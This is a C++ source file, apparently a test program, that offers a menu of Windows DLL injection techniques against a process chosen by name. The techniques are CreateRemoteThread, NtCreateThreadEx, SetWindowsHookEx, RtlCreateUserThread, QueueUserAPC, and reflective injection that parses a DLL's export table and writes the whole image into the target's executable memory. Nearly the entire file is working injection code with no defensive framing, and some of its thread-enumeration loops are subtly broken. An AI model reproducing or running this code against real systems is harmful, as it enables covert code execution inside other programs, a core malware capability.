// test.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#undef UNICODE
#include "Injection.h"

BOOL CreateRemoteThread1(char* dllPath, HANDLE processHandle) {
    LPVOID pDllPath = VirtualAllocEx(processHandle, NULL, (strlen(dllPath) ) , MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("Memory %p\n", pDllPath);
    BOOL Written = WriteProcessMemory(processHandle, pDllPath, dllPath, (strlen(dllPath)), NULL);
    HMODULE kernel32mo = GetModuleHandleA("kernel32");
    LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32mo, "LoadLibraryA");
    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, NULL, loadlib, pDllPath, NULL, NULL);
    WaitForSingleObject(threadHandle, INFINITE);
	CloseHandle(threadHandle);
    return TRUE;
}
BOOL NtCreateThreadEx2(char* dllPath, HANDLE processHandle) {
    LPVOID pDllPath = VirtualAllocEx(processHandle, NULL, (strlen(dllPath)), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("Memory %p\n", pDllPath);
    BOOL Written = WriteProcessMemory(processHandle, pDllPath, dllPath, (strlen(dllPath)), NULL);
    HMODULE modNtDll = GetModuleHandleA("ntdll.dll");
    HMODULE kernel32mo = GetModuleHandleA("kernel32");
    LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32mo, "LoadLibraryA");
    lpNtCreateThreadEx funNtCreateThreadEx = (lpNtCreateThreadEx)GetProcAddress(modNtDll, "NtCreateThreadEx");
	NtCreateThreadExBuffer ntBuffer;

	memset(&ntBuffer, 0, sizeof(NtCreateThreadExBuffer));
	ULONG temp0[2];
	ULONG temp1;

	ntBuffer.Size = sizeof(NtCreateThreadExBuffer);
	ntBuffer.Unknown1 = 0x10003;
	ntBuffer.Unknown2 = sizeof(temp0);
	ntBuffer.Unknown3 = temp0;
	ntBuffer.Unknown4 = 0;
	ntBuffer.Unknown5 = 0x10004;
	ntBuffer.Unknown6 = sizeof(temp1);
	ntBuffer.Unknown7 = &temp1;
	ntBuffer.Unknown8 = 0;

	HANDLE threadHandle = NULL;

	NTSTATUS status = funNtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS,nullptr, processHandle, loadlib, pDllPath, NULL, 0,0,0, &ntBuffer);
    //HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, NULL, loadlib, pDllPath, NULL, NULL);
    WaitForSingleObject(threadHandle, INFINITE);
	CloseHandle(threadHandle);
    return TRUE;
}
BOOL SetWindowsHookEx3(char* dllPath, DWORD processId) {
    HMODULE hModDll = LoadLibraryA(dllPath);
    HOOKPROC procAddress = (HOOKPROC)GetProcAddress(hModDll, "_ReflectiveLoader@4");
    HANDLE threadHandleSnap = INVALID_HANDLE_VALUE;
    threadHandleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    te32.dwSize = sizeof(THREADENTRY32);
    DWORD threadId = 0;
	do {
		if (te32.th32OwnerProcessID == processId) {

			threadId = te32.th32ThreadID;
			HANDLE threadHandle = OpenThread(READ_CONTROL, FALSE, te32.th32ThreadID);

			if (threadHandle) {
				printf("Setting hook in thread with ID %d\n", threadId);
				HHOOK hookHandle = SetWindowsHookExA(WH_KEYBOARD, procAddress, hModDll, (DWORD)threadId);

				if (!hookHandle) {
					return false;
				}
				else
				{
					UnhookWindowsHookEx(hookHandle);
					return true;
				}
			}			
		}
	} while (Thread32Next(threadHandleSnap, &te32));
}
BOOL RtlCreatUserThread4(char* dllPath, HANDLE processHandle) {
    LPVOID pDllPath = VirtualAllocEx(processHandle, NULL, (strlen(dllPath)), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("Memory %p\n", pDllPath);
    BOOL Written = WriteProcessMemory(processHandle, pDllPath, dllPath, (strlen(dllPath)), NULL);
    HMODULE modNtDll = GetModuleHandleA("ntdll.dll");
    HMODULE kernel32mo = GetModuleHandleA("kernel32");
    LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32mo, "LoadLibraryA");
    pRtlCreatUserThread funRtlCreateUserThread = (pRtlCreatUserThread)GetProcAddress(modNtDll, "RtlCreateUserThread");
	HANDLE threadHandle = NULL;

    funRtlCreateUserThread(processHandle, NULL, 0, 0, 0, 0, loadlib, pDllPath, &threadHandle, NULL);
    WaitForSingleObject(threadHandle, INFINITE);
	CloseHandle(threadHandle);
    return TRUE;
}
BOOL QueueUserAPC5(char* dllPath, HANDLE processHandle, DWORD processId) {
    //LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    LPVOID pDllPath = VirtualAllocEx(processHandle, NULL, (strlen(dllPath)), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("Memory %p\n", pDllPath);
    BOOL Written = WriteProcessMemory(processHandle, pDllPath, dllPath, (strlen(dllPath)), NULL);
    HMODULE kernel32mo = GetModuleHandleA("kernel32");
    LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32mo, "LoadLibraryA");
	HANDLE threadHandleSnap = INVALID_HANDLE_VALUE;
	threadHandleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	te32.dwSize = sizeof(THREADENTRY32);
	DWORD threadId = 0;
	do {
		if (te32.th32OwnerProcessID == processId) {

			threadId = te32.th32ThreadID;
			HANDLE threadHandle = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);

			if (threadHandle) {
				printf("Thread %d is opened succesfully\n", threadId);
				DWORD dwResult = QueueUserAPC((PAPCFUNC)loadlib, threadHandle, (ULONG_PTR)pDllPath);
				if (dwResult) {
					return true;
				}
			}
			else return false;
		}
	} while (Thread32Next(threadHandleSnap, &te32));
    //WaitForSingleObject(threadHandle, INFINITE);
    return TRUE;
}
DWORD Rva2Offset(DWORD addressRVA, UINT_PTR filedata)
{
	WORD i = 0;
	PIMAGE_SECTION_HEADER sectionheader = NULL;
	PIMAGE_NT_HEADERS ntheaders = NULL;

	ntheaders = (PIMAGE_NT_HEADERS)(filedata + ((PIMAGE_DOS_HEADER)filedata)->e_lfanew);

	sectionheader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&ntheaders->OptionalHeader) + ntheaders->FileHeader.SizeOfOptionalHeader);

	if (addressRVA < sectionheader[0].PointerToRawData)
		return addressRVA;

	for (i = 0; i < ntheaders->FileHeader.NumberOfSections; i++)
	{
		if (addressRVA >= sectionheader[i].VirtualAddress && addressRVA < (sectionheader[i].VirtualAddress + sectionheader[i].SizeOfRawData))
			return (addressRVA - sectionheader[i].VirtualAddress + sectionheader[i].PointerToRawData);
	}

	return 0;
}
DWORD GetOffset(VOID* fileDll)
{
	UINT_PTR filedata = 0;
	UINT_PTR ntheaders = 0;
	UINT_PTR AddressOfName = 0;
	UINT_PTR AddressOfFunc = 0;
	UINT_PTR AddressOfNameOrd = 0;
	DWORD i = 0;
	DWORD dwCompiledArch = 2;

	filedata = (UINT_PTR)fileDll;
	ntheaders = filedata + ((PIMAGE_DOS_HEADER)filedata)->e_lfanew;
	AddressOfName = (UINT_PTR) & ((PIMAGE_NT_HEADERS)ntheaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	ntheaders = filedata + Rva2Offset(((PIMAGE_DATA_DIRECTORY)AddressOfName)->VirtualAddress, filedata);
	AddressOfName = filedata + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)ntheaders)->AddressOfNames, filedata);
	AddressOfFunc = filedata + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)ntheaders)->AddressOfFunctions, filedata);
	AddressOfNameOrd = filedata + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)ntheaders)->AddressOfNameOrdinals, filedata);
	i = ((PIMAGE_EXPORT_DIRECTORY)ntheaders)->NumberOfNames;
	while (i--)
	{
		char* funcName = (char*)(filedata + Rva2Offset(*(DWORD *)(AddressOfName), filedata));

		if (strstr(funcName, "ReflectiveLoader") != NULL)
		{
			AddressOfFunc = filedata + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)ntheaders)->AddressOfFunctions, filedata);

			AddressOfFunc += (*(WORD *)(AddressOfNameOrd) * sizeof(DWORD));

			return Rva2Offset(*(DWORD *)(AddressOfFunc), filedata);
		}
		AddressOfName += sizeof(DWORD);
		AddressOfNameOrd += sizeof(WORD);
	}
	return 0;
}
BOOL CreateRemoteThread_Re(char* dllPath, HANDLE processHandle)
{
	HANDLE file = NULL;
	HANDLE hModule = NULL;
	LPVOID filedata = NULL;
	DWORD filesize = 0;
	DWORD bytesread = 0;
	TOKEN_PRIVILEGES priv = { 0 };
	file = CreateFileA(dllPath, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	filesize = GetFileSize(file, NULL);
	filedata = HeapAlloc(GetProcessHeap(), 0, filesize);
	ReadFile(file, filedata, filesize, &bytesread, NULL);
	DWORD offset = GetOffset(filedata);
	LPVOID pDllPath = VirtualAllocEx(processHandle, NULL, filesize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("Memory %p\n", (void*)pDllPath);
	WriteProcessMemory(processHandle, pDllPath, filedata, filesize, NULL);
	LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pDllPath + offset);
	HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, NULL, loadlib, NULL, NULL, NULL);
	WaitForSingleObject(threadHandle, INFINITE);
	CloseHandle(threadHandle);
	return TRUE;
}
BOOL NtCreateThreadEx_Re(char* dllPath, HANDLE processHandle)
{
	HANDLE file = NULL;
	HANDLE hModule = NULL;
	LPVOID filedata = NULL;
	DWORD filesize = 0;
	DWORD bytesread = 0;
	TOKEN_PRIVILEGES priv = { 0 };
	file = CreateFileA(dllPath, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	filesize = GetFileSize(file, NULL);
	filedata = HeapAlloc(GetProcessHeap(), 0, filesize);
	ReadFile(file, filedata, filesize, &bytesread, NULL);
	DWORD offset = GetOffset(filedata);
	LPVOID pDllPath = VirtualAllocEx(processHandle, NULL, filesize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("Memory %p\n", (void*)pDllPath);
	WriteProcessMemory(processHandle, pDllPath, filedata, filesize, NULL);
	LPTHREAD_START_ROUTINE loadlib = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pDllPath + offset);
	HMODULE modNtDll = GetModuleHandleA("ntdll.dll");
	lpNtCreateThreadEx funNtCreateThreadEx = (lpNtCreateThreadEx)GetProcAddress(modNtDll, "NtCreateThreadEx");
	NtCreateThreadExBuffer ntBuffer;

	memset(&ntBuffer, 0, sizeof(NtCreateThreadExBuffer));
	ULONG temp0[2];
	ULONG temp1;

	ntBuffer.Size = sizeof(NtCreateThreadExBuffer);
	ntBuffer.Unknown1 = 0x10003;
	ntBuffer.Unknown2 = sizeof(temp0);
	ntBuffer.Unknown3 = temp0;
	ntBuffer.Unknown4 = 0;
	ntBuffer.Unknown5 = 0x10004;
	ntBuffer.Unknown6 = sizeof(temp1);
	ntBuffer.Unknown7 = &temp1;
	ntBuffer.Unknown8 = 0;

	HANDLE threadHandle = NULL;

	NTSTATUS status = funNtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, nullptr, processHandle, loadlib, pDllPath, NULL, 0, 0, 0, nullptr);

	//HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, NULL, loadlib, NULL, NULL, NULL);
	WaitForSingleObject(threadHandle, INFINITE);
	CloseHandle(threadHandle);
	return TRUE;
}
DWORD GetProcessId(LPSTR name)
{
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	DWORD pid = 0;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(snapshot, &pe32))
		{
			do
			{
				//printf("%s \n", pe32.szExeFile);
				if (!lstrcmp(pe32.szExeFile, name))
				{
					pid = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return pid;
}
int main()
{
	DWORD processID;
	char dllPath[MAX_PATH];
	GetFullPathNameA(("testdll32.dll"), MAX_PATH, (LPSTR)dllPath, NULL);
	printf_s("DLL %s \n", dllPath);
	char processName[100];
	printf("Process Name: ");	
	scanf_s("%99s", processName, 99);
	processID = GetProcessId((LPSTR)processName);
	printf("Process PID: %d \n", processID);
    HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, processID);
	int c = -1;
	printf("1. CreateRemoteThread\n");
	printf("2. NtCreateThreadEx\n");
	printf("3. SetWindowsHookEx\n");
	printf("4. RtlCreatUserThread\n");
	printf("5. CreateRemoteThread Reflective\n");
	printf("6. NtCreateThreadEx Reflective\n");
	printf("Input: ");
	scanf_s("%d",&c);
	switch (c) {
	case 1:
		CreateRemoteThread1((char *)dllPath, hProcess);
		break;
	case 2:
		NtCreateThreadEx2((char*)dllPath, hProcess);
		break;
	case 3:
		SetWindowsHookEx3((char*)dllPath, processID);
		break;
	case 4:
		RtlCreatUserThread4((char*)dllPath, hProcess);
		break;
	case 5:
		CreateRemoteThread_Re((char*)dllPath, hProcess);
		break;
	case 6:
		NtCreateThreadEx_Re((char*)dllPath, hProcess);
		break;
	default:
		break;
	} 
	//QueueUserAPC5((char*)dllPath, processHandle, processID);	
    return 0;
}